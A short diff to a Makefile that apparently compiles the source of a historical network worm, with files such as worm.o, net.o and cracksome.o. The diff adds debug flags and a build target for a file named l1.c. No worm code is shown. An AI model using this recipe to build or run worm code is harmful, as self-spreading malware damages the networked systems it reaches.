@@ -4,7 +4,7 @@ H_FILES = worm.h
 OFILES = worm.o net.o hs.o cracksome.o stubs.o
 
 # Luckily, the original used no optimization
-CFLAGS =
+CFLAGS = -ggdb3
 # Most sites will have to remove the "-D" -- send for our souped-up version
 # of ctags becker@trantor.harris-atd.com
 
@@ -13,6 +13,9 @@ TAGS_FLAGS = -xDt
 test: $(OFILES)
 	$(CC) -o test $(OFILES)
 $(OFILES): worm.h
+
+l1: l1.c
+	$(CC) -o l1 $(CFLAGS) $^
 
 clean:
 	rm -f *.o *~ *.bak
